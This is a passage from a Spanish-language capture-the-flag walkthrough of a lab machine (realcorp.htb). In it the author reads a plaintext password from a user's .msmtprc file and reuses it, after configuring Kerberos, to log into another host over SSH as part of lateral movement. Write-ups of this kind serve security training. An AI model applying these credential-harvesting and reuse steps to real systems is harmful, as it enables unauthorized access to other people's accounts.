<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">drwxr-xr-x.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root</span><span style="color:#B56959;--shiki-dark:#C3E88D">       root</span><span style="color:#2F798A;--shiki-dark:#F78C6C">       24</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Dec</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  8</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:56</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">drwxr-xr-x.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root</span><span style="color:#B56959;--shiki-dark:#C3E88D">       root</span><span style="color:#2F798A;--shiki-dark:#F78C6C">       96</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Dec</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  8</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 18</span><span style="color:#B56959;--shiki-dark:#C3E88D">:50</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ..</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">drwxr-xr-x.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 59</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Dec</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  9</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 12</span><span style="color:#B56959;--shiki-dark:#C3E88D">:31</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span></span></code></pre> 
<p>Parece que el único usuario de este sistema es j.nakazawa. Echemos un vistazo a su carpeta de inicio.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">root@smtp:/home/j.nakazawa#</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ls</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -alh</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">total</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 16</span><span style="color:#B56959;--shiki-dark:#C3E88D">K</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">drwxr-xr-x.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   59</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Dec</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  9</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 12</span><span style="color:#B56959;--shiki-dark:#C3E88D">:31</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">drwxr-xr-x.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root</span><span style="color:#B56959;--shiki-dark:#C3E88D">       root</span><span style="color:#2F798A;--shiki-dark:#F78C6C">         24</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Dec</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  8</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:56</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ..</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">lrwxrwxrwx.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root</span><span style="color:#B56959;--shiki-dark:#C3E88D">       root</span><span style="color:#2F798A;--shiki-dark:#F78C6C">          9</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Dec</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  9</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 12</span><span style="color:#B56959;--shiki-dark:#C3E88D">:31</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .bash_history</span><span style="color:#393A34;--shiki-dark:#BABED8"> -</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /dev/null</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-rw-r--r--.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  220</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Apr</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 18</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  2019</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .bash_logout</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-rw-r--r--.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3.5</span><span style="color:#B56959;--shiki-dark:#C3E88D">K</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Apr</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 18</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  2019</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .bashrc</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-rw-------.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  476</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Dec</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  8</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 19</span><span style="color:#B56959;--shiki-dark:#C3E88D">:12</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .msmtprc</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-rw-r--r--.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  807</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Apr</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 18</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  2019</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .profile</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">lrwxrwxrwx.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root</span><span style="color:#B56959;--shiki-dark:#C3E88D">       root</span><span style="color:#2F798A;--shiki-dark:#F78C6C">          9</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Dec</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  9</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 12</span><span style="color:#B56959;--shiki-dark:#C3E88D">:31</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .viminfo</span><span style="color:#393A34;--shiki-dark:#BABED8"> -</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /dev/null</span></span></code></pre> 
<p>Detectamos un archivo interesante en la carpeta de inicio del usuario: .msmtprc. Este es un archivo de configuración para usar el cliente SMTP. Comprobemos posibles contraseñas.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">root@smtp:/home/j.nakazawa#</span><span style="color:#B56959;--shiki-dark:#C3E88D"> cat</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .msmtprc</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># Set default values for all following accounts.</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">defaults</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">auth</span><span style="color:#B56959;--shiki-dark:#C3E88D">           on</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">tls</span><span style="color:#B56959;--shiki-dark:#C3E88D">            on</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">tls_trust_file</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /etc/ssl/certs/ca-certificates.crt</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">logfile</span><span style="color:#B56959;--shiki-dark:#C3E88D">        /dev/null</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># RealCorp Mail</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">account</span><span style="color:#B56959;--shiki-dark:#C3E88D">        realcorp</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">host</span><span style="color:#2F798A;--shiki-dark:#F78C6C">           127.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0.1</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">port</span><span style="color:#2F798A;--shiki-dark:#F78C6C">           587</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">from</span><span style="color:#B56959;--shiki-dark:#C3E88D">           j.nakazawa@realcorp.htb</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">user</span><span style="color:#B56959;--shiki-dark:#C3E88D">           j.nakazawa</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">password</span><span style="color:#B56959;--shiki-dark:#C3E88D">       sJB}R</span><span style="color:#393A34;--shiki-dark:#BABED8">M</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D">6Z~64_</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">tls_fingerprint</span><span style="color:#B56959;--shiki-dark:#C3E88D"> C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># Set a default account</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">account</span><span style="color:#B56959;--shiki-dark:#C3E88D"> default</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :</span><span style="color:#B56959;--shiki-dark:#C3E88D"> realcorp</span></span></code></pre> 
<p>Obtenemos las credenciales para el usuario j.nakazawa:sJB}RM6Z~64_</p>
<p>Intentemos iniciar sesión en el servidor principal a través de SSH.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">ssh</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa@10.10.10.224</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">j.nakazawa@10.10.10.224</span><span style="color:#B56959;--shiki-dark:#C3E88D"> password:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sJB}R</span><span style="color:#393A34;--shiki-dark:#BABED8">M</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D">6Z~64_</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Permission</span><span style="color:#B56959;--shiki-dark:#C3E88D"> denied,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> please</span><span style="color:#B56959;--shiki-dark:#C3E88D"> try</span><span style="color:#B56959;--shiki-dark:#C3E88D"> again.</span></span></code></pre> 
<p>Parece que esto no funciona. Sin embargo, el mensaje de error me llama la atención. Nunca antes había visto gssapi-keyex ni gssapi-with-mic. Empecemos a investigar.</p>
<h2 id="investigando-la-autenticación-ssh-usando-gssapi">Investigando la autenticación SSH usando gssapi</h2>
<p>Después de buscar esto por un tiempo, encontré esta respuesta en serverfault: <a href="https://serverfault.com/questions/75362/what-is-gssapi-with-mic/1041704#1041704">https://serverfault.com/questions/75362/what-is-gssapi-with-mic/1041704#1041704</a></p>
<p>que habla de que está relacionada con Kerberos. Esto tendría sentido ya que hay varios puertos abiertos relacionados con Kerberos. Continuaremos nuestra investigación para que SSH utilice Kerberos.</p>
<p>Finalmente, encontré este documento de AWS: <a href="https://docs.aws.amazon.com/en_us/emr/latest/ManagementGuide/emr-kerberos-connect-ssh.html">https://docs.aws.amazon.com/en_us/emr/latest/ManagementGuide/emr-kerberos-connect-ssh.html</a></p>
<p>que parece describir bastante bien nuestro escenario. Esto indica que tenemos que configurar el archivo <code>/etc/krb5.conf</code>, ejecutar kinit y luego usar ssh -K.</p>
<h2 id="configuración-de-la-autenticación-kerberos">Configuración de la autenticación Kerberos</h2>
<p>Ok, comencemos configurando <code>/etc/krb5.conf</code>, para esto primero tenemos que instalar <code>krb5-user</code> (apt install krb5-user).</p>
<p>El archivo <code>/etc/krb5.conf</code> debería tener el siguiente aspecto:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">cat</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /etc/krb5.conf</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">libdefaults</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">        default_realm</span><span style="color:#B56959;--shiki-dark:#C3E88D"> =</span><span style="color:#B56959;--shiki-dark:#C3E88D"> REALCORP.HTB</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Change default realm</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">        </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">        [</span><span style="color:#393A34;--shiki-dark:#BABED8">...</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">realms</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">		# Add realm</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">        REALCORP.HTB</span><span style="color:#B56959;--shiki-dark:#C3E88D"> =</span><span style="color:#B56959;--shiki-dark:#C3E88D"> {</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">                kdc</span><span style="color:#B56959;--shiki-dark:#C3E88D"> =</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">        }</span></span></code></pre> 
<p>Configuramos la hora, con la hora de la maquina victima:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">ntpdate</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span></span></code></pre> 
<p>Ahora deberíamos ejecutar kinit con nuestro usuario.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">kinit</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Password</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa@REALCORP.HTB:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sJB}R</span><span style="color:#393A34;--shiki-dark:#BABED8">M</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D">6Z~64_</span></span></code></pre> 
<p>Si tenemos éxito, deberíamos ver un ticket en el caché, si ejecutamos klist.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">klist</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Ticket</span><span style="color:#B56959;--shiki-dark:#C3E88D"> cache:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> FILE:/tmp/krb5cc_0</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Default</span><span style="color:#B56959;--shiki-dark:#C3E88D"> principal:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> j.nakazawa@REALCORP.HTB</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Valid</span><span style="color:#B56959;--shiki-dark:#C3E88D"> starting</span><span style="color:#B56959;--shiki-dark:#C3E88D">       Expires</span><span style="color:#B56959;--shiki-dark:#C3E88D">              Service</span><span style="color:#B56959;--shiki-dark:#C3E88D"> principal</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">02/23/2021</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 20</span><span style="color:#B56959;--shiki-dark:#C3E88D">:47:48</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  02</span><span style="color:#B56959;--shiki-dark:#C3E88D">/24/2021</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 20</span><span style="color:#B56959;--shiki-dark:#C3E88D">:41:46</span><span style="color:#B56959;--shiki-dark:#C3E88D">  krbtgt/REALCORP.HTB@REALCORP.HTB</span></span></code></pre> 
<p>obtenemos un ticket válido que debería permitirnos ingresar mediante SSH a la máquina.</p>
<h2 id="ssh-using-kerberos">SSH using Kerberos</h2>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">ssh</span><span style="color:#B56959;--shiki-dark:#C3E88D">  j.nakazawa@REALCORP.HTB</span></span></code></pre> 
<h1 id="lateral-movement-2">Lateral Movement #2</h1>
<p>Veamos qué usuarios están en el sistema.</p>
